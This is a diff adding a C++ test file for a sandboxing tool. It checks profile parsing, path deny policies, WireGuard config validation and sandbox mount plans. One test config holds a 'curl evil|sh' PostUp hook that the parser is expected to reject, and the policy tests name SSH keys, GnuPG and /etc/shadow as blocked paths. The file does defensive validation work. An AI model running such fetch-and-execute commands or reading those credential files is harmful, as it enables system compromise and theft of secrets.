@@ -1,0 +1,245 @@
+// Minimal dependency-free test runner.
+#include <cstdio>
+#include <functional>
+#include <unistd.h>
+
+#include "core/plan.hpp"
+#include "net/netns.hpp"
+#include "util/sys.hpp"
+
+using namespace hf;
+
+static int g_fail = 0, g_run = 0;
+#define CHECK(c) do { ++g_run; if (!(c)) { ++g_fail; std::printf("  FAIL %s:%d: %s\n", __FILE__, __LINE__, #c); } } while (0)
+#define THROWS(T, expr) do { ++g_run; bool t_ = false; try { expr; } catch (const T&) { t_ = true; } catch (...) {} \
+    if (!t_) { ++g_fail; std::printf("  FAIL %s:%d: expected %s from %s\n", __FILE__, __LINE__, #T, #expr); } } while (0)
+static void test(const char* n, const std::function<void()>& f) { std::printf("* %s\n", n); f(); }
+
+static User fake_user() {
+    User u; u.uid = 1000; u.gid = 1000; u.name = "alice"; u.home = "/home/alice"; u.runtime_dir = "/run/user/1000";
+    return u;
+}
+static bool has_seq(const Strings& v, std::initializer_list<std::string> seq) {
+    for (size_t i = 0; i + seq.size() <= v.size(); ++i) {
+        size_t j = 0; bool ok = true;
+        for (auto& s : seq) { if (v[i + j] != s) { ok = false; break; } ++j; }
+        if (ok) return true;
+    }
+    return false;
+}
+
+int main() {
+    test("split_words", [] {
+        CHECK((split_words("a b  c") == Strings{"a", "b", "c"}));
+        CHECK((split_words("librewolf --profile '/tmp/my lw' \"x y\"") == Strings{"librewolf", "--profile", "/tmp/my lw", "x y"}));
+        CHECK((split_words("a \"\" b") == Strings{"a", "", "b"}));
+        THROWS(Error, split_words("a 'b"));
+    });
+
+    test("path_under / norm", [] {
+        CHECK(path_under("/home/a/.ssh/id", "/home/a/.ssh"));
+        CHECK(path_under("/home/a/.ssh", "/home/a/.ssh"));
+        CHECK(!path_under("/home/a/.sshx", "/home/a/.ssh"));
+        CHECK(!path_under("/home", "/home/a"));
+        CHECK(path_under("/home/a/../a/x/", "/home/a"));
+    });
+
+    test("profile parser", [] {
+        Profile p = parse_profile("[profile]\nname=x\ncommand = a 'b c'  # trailing\nmode=bundle\n[fs]\nro_try = /a => /b\nrw = $HOME/p\n"
+                                  "[env]\nset = K=V=W\n[network]\nmode=ivpn\nsubnet=7\n[bundle]\nprovision = echo a#b\n", "t");
+        CHECK(p.root == RootMode::Bundle);
+        CHECK((p.command == Strings{"a", "b c"}));
+        CHECK(p.mounts.size() == 2 && p.mounts[0].optional && !p.mounts[0].rw && p.mounts[0].dst == "/b" && p.mounts[1].rw);
+        CHECK(p.env_set.at(0).second == "V=W");
+        CHECK(p.net == NetMode::Ivpn && p.subnet_octet == 7);
+        CHECK(p.provision.at(0) == "echo a#b");
+        THROWS(ProfileError, parse_profile("[profile]\nbogus=1\n", "t"));
+        THROWS(ProfileError, parse_profile("[nope]\na=1\n", "t"));
+        THROWS(ProfileError, parse_profile("a=1\n", "t"));
+        THROWS(ProfileError, parse_profile("[profile]\nmode=maybe\n", "t"));
+        THROWS(ProfileError, parse_profile("[network]\nsubnet=300\n", "t"));
+    });
+
+    test("expand", [] {
+        User u = fake_user(); VarCtx c; c.user = &u;
+        CHECK(expand("~/x", c) == "/home/alice/x");
+        CHECK(expand("$HOME/${USER}/$UID", c) == "/home/alice/alice/1000");
+        THROWS(ProfileError, expand("$NOPE/x", c));
+    });
+
+    test("policy: blacklist and sensitive roots", [] {
+        User u = fake_user();
+        Policy p(u, {"/data/secret"});
+        THROWS(PolicyError, p.check_bind("/home/alice", true));          // $HOME itself
+        THROWS(PolicyError, p.check_bind("/home", false));
+        THROWS(PolicyError, p.check_bind("/", false));
+        THROWS(PolicyError, p.check_bind("/home/alice/.ssh", false));    // denied
+        THROWS(PolicyError, p.check_bind("/home/alice/.ssh/id_ed25519", false));
+        THROWS(PolicyError, p.check_bind("/home/alice/.config/BraveSoftware/x", false));
+        THROWS(PolicyError, p.check_bind("/data/secret/k", false));      // user deny
+        THROWS(PolicyError, p.check_bind("/etc/shadow", false));
+        THROWS(PolicyError, p.check_bind("/usr/lib/x", true));           // rw into system
+        THROWS(PolicyError, p.check_bind("/run/media/alice/USB", true)); // removable-media root
+        p.check_bind("/home/alice/Projects/foo", true);                  // fine
+        p.check_bind("/usr/lib", false);
+        p.check_bind("/run/media/alice/USB/work", true);
+        THROWS(PolicyError, p.check_cwd("/home/alice"));
+    });
+
+    test("policy: ancestor exposure is refused only when the denied path exists", [] {
+        char tmpl[] = "/tmp/hf-pol-XXXXXX";
+        std::string d = mkdtemp(tmpl);
+        fs::create_directories(d + "/home/.ssh");
+        User u = fake_user(); u.home = d + "/home";
+        Policy p(u, {});
+        THROWS(PolicyError, p.check_bind(d + "/home/.ssh", false));
+        fs::remove_all(d);
+    });
+
+    test("policy: symlink to denied path is resolved", [] {
+        char tmpl[] = "/tmp/hf-sym-XXXXXX";
+        std::string d = mkdtemp(tmpl);
+        fs::create_directories(d + "/home/.gnupg");
+        fs::create_directories(d + "/home/proj");
+        fs::create_symlink(d + "/home/.gnupg", d + "/home/proj/link");
+        User u = fake_user(); u.home = d + "/home";
+        Policy p(u, {});
+        THROWS(PolicyError, p.check_bind(d + "/home/proj/link", false));
+        fs::remove_all(d);
+    });
+
+    test("wireguard config parsing", [] {
+        WgInfo w = parse_wg_conf("[Interface]\nPrivateKey = k\nAddress = 10.0.0.2/32\nDNS = 10.0.254.1, 10.0.254.2\n"
+                                 "[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\nEndpoint = 198.51.100.7:2049\n");
+        CHECK(w.endpoint_ip == "198.51.100.7" && w.endpoint_port == 2049);
+        CHECK((w.dns == Strings{"10.0.254.1", "10.0.254.2"}));
+        CHECK(w.sanitized.find("DNS") == std::string::npos);
+        CHECK(w.sanitized.find("PrivateKey") != std::string::npos);
+        THROWS(ProfileError, parse_wg_conf("[Peer]\nEndpoint = vpn.example.com:51820\n"));
+        THROWS(ProfileError, parse_wg_conf("[Peer]\nEndpoint = [::1]:51820\n"));
+        THROWS(ProfileError, parse_wg_conf("[Peer]\nEndpoint = 1.2.3.4:99999\n"));
+        THROWS(ProfileError, parse_wg_conf("[Interface]\nPostUp = curl evil|sh\n[Peer]\nEndpoint = 1.2.3.4:1\n"));
+        THROWS(ProfileError, parse_wg_conf("[Interface]\npostdown=x\n[Peer]\nEndpoint = 1.2.3.4:1\n"));
+        THROWS(ProfileError, parse_wg_conf("[Interface]\nTable = off\n[Peer]\nEndpoint = 1.2.3.4:1\n"));
+        THROWS(ProfileError, parse_wg_conf("[Peer]\nEndpoint = 1.2.3.4:1\n[Peer]\nEndpoint = 5.6.7.8:1\n"));
+        THROWS(ProfileError, parse_wg_conf("[Interface]\nPrivateKey=k\n"));
+    });
+
+    test("netns naming", [] {
+        CHECK(valid_ns_name("hf-librewolf"));
+        CHECK(!valid_ns_name("hf-"));
+        CHECK(!valid_ns_name("../etc"));
+        CHECK(!valid_ns_name("hf-a b"));
+        CHECK(!valid_ns_name("ivpn"));
+        int o = derive_octet("hf-librewolf");
+        CHECK(o >= 1 && o <= 254 && o == derive_octet("hf-librewolf"));
+    });
+
+    test("git entries: dirs and files, no descent", [] {
+        char tmpl[] = "/tmp/hf-git-XXXXXX";
+        std::string d = mkdtemp(tmpl);
+        fs::create_directories(d + "/.git/modules/.git");   // nested inside a match: must NOT be reported
+        fs::create_directories(d + "/a/b/.git");
+        fs::create_directories(d + "/wt");
+        write_file(d + "/wt/.git", "gitdir: /x\n", 0644);   // worktree/submodule style file
+        auto g = find_git_entries(d);
+        CHECK(g.size() == 3);
+        fs::remove_all(d);
+    });
+
+    test("xauth file format", [] {
+        char tmpl[] = "/tmp/hf-xa-XXXXXX";
+        std::string d = mkdtemp(tmpl);
+        write_xauth(d + "/x", "91", std::string(16, 'A'));
+        std::string s = read_file(d + "/x");
+        CHECK(s.size() == 2 + 2 + 2 + 2 + 2 + 18 + 2 + 16);
+        CHECK((unsigned char)s[0] == 0xff && (unsigned char)s[1] == 0xff);   // FamilyWild
+        CHECK(s.substr(6, 2) == "91");
+        fs::remove_all(d);
+    });
+
+    test("plan: isolation invariants (host mode)", [] {
+        char tmpl[] = "/tmp/hf-plan-XXXXXX";
+        std::string d = mkdtemp(tmpl);
+        User u = fake_user(); u.home = d + "/home"; fs::create_directories(u.home);
+        u.runtime_dir = d + "/run";
+        Policy pol(u, {});
+        Profile p = parse_profile("[profile]\nname=t\ncommand=sh\n[bin]\nallow = sh\n[home]\nuser=box\n", "t");
+        PlanCtx c; c.user = u; c.paths = make_paths(u, "t"); c.paths.data = d + "/data"; c.paths.home = d + "/data/home";
+        c.policy = &pol; c.session = d + "/sess"; fs::create_directories(c.session);
+        Plan pl = build_plan(p, c);
+        const Strings& a = pl.b.args();
+        CHECK(has_seq(a, {"--unshare-all"}));
+        CHECK(has_seq(a, {"--cap-drop", "ALL"}));
+        CHECK(has_seq(a, {"--die-with-parent"}));
+        CHECK(has_seq(a, {"--clearenv"}));
+        CHECK(!has_seq(a, {"--share-net"}));                       // network none by default
+        CHECK(!has_seq(a, {"--ro-bind", "/", "/"}));                // never whole host
+        CHECK(!has_seq(a, {"--dev-bind"}));
+        CHECK(has_seq(a, {"--ro-bind", c.session.string() + "/passwd", "/etc/passwd"}));
+        CHECK(has_seq(a, {"--setenv", "HOME", "/home/box"}));
+        CHECK((pl.b.cmd() == Strings{"sh"}));
+        for (size_t i = 0; i + 2 < a.size(); ++i)                   // host /etc/passwd must never be bound
+            if (a[i] == "--ro-bind" || a[i] == "--bind") CHECK(a[i + 1] != "/etc/passwd");
+        // network on => share-net + resolv.conf; ivpn goes through the same path
+        c.network = true;
+        Plan pl2 = build_plan(p, c);
+        CHECK(has_seq(pl2.b.args(), {"--share-net"}));
+        fs::remove_all(d);
+    });
+
+    test("plan: policy blocks dangerous user mounts", [] {
+        char tmpl[] = "/tmp/hf-plan2-XXXXXX";
+        std::string d = mkdtemp(tmpl);
+        User u = fake_user(); u.home = d + "/home"; fs::create_directories(u.home / ".ssh");
+        u.runtime_dir = d + "/run";
+        Policy pol(u, {});
+        PlanCtx c; c.user = u; c.paths = make_paths(u, "t"); c.paths.home = d + "/h"; c.policy = &pol;
+        c.session = d + "/s"; fs::create_directories(c.session);
+        Profile p = parse_profile("[profile]\ncommand=sh\n[fs]\nro = " + u.home.string() + "/.ssh\n", "t");
+        THROWS(PolicyError, build_plan(p, c));
+        Profile q = parse_profile("[profile]\ncommand=sh\n[home]\nbind = .ssh\n", "t");
+        THROWS(PolicyError, build_plan(q, c));
+        Profile r = parse_profile("[profile]\ncommand=sh\n[fs]\nrw = /usr/lib\n", "t");
+        THROWS(PolicyError, build_plan(r, c));
+        fs::remove_all(d);
+    });
+
+    test("plan: cwd mount re-binds .git read-only after the rw bind", [] {
+        char tmpl[] = "/tmp/hf-plan3-XXXXXX";
+        std::string d = mkdtemp(tmpl);
+        User u = fake_user(); u.home = d + "/home"; u.runtime_dir = d + "/run";
+        fs::create_directories(d + "/proj/.git"); fs::create_directories(d + "/proj/sub/.git");
+        Policy pol(u, {});
+        PlanCtx c; c.user = u; c.paths = make_paths(u, "t"); c.paths.home = d + "/h"; c.policy = &pol;
+        c.session = d + "/s"; fs::create_directories(c.session);
+        c.cwd = d + "/proj"; c.mount_cwd = true;
+        Profile p = parse_profile("[profile]\ncommand=sh\n", "t");
+        Plan pl = build_plan(p, c);
+        const Strings& a = pl.b.args();
+        auto pos = [&](std::initializer_list<std::string> s) { for (size_t i = 0; i + s.size() <= a.size(); ++i) { size_t j = 0; bool ok = true; for (auto& x : s) { if (a[i + j] != x) { ok = false; break; } ++j; } if (ok) return (long)i; } return -1L; };
+        long rw = pos({"--bind", d + "/proj", "/shared"});
+        long ro1 = pos({"--ro-bind", d + "/proj/.git", "/shared/.git"});
+        long ro2 = pos({"--ro-bind", d + "/proj/sub/.git", "/shared/sub/.git"});
+        CHECK(rw >= 0 && ro1 > rw && ro2 > rw);
+        // $HOME as working tree is refused outright
+        c.cwd = u.home; fs::create_directories(u.home);
+        THROWS(PolicyError, build_plan(p, c));
+        fs::remove_all(d);
+    });
+
+    test("font matching", [] {
+        char tmpl[] = "/tmp/hf-font-XXXXXX";
+        std::string d = mkdtemp(tmpl);
+        fs::create_directories(d + "/truetype/liberation"); fs::create_directories(d + "/TTF"); fs::create_directories(d + "/noto");
+        write_file(d + "/truetype/liberation/LiberationSans-Regular.ttf", "x", 0644);
+        write_file(d + "/TTF/DejaVuSans.ttf", "x", 0644);
+        write_file(d + "/noto/NotoSans.ttf", "x", 0644);
+        auto m = match_font_files(d, {"liberation", "dejavu"});
+        CHECK(m.size() == 2);
+        fs::remove_all(d);
+    });
+
+    std::printf("\n%d checks, %d failed\n", g_run, g_fail);
+    return g_fail ? 1 : 0;
+}
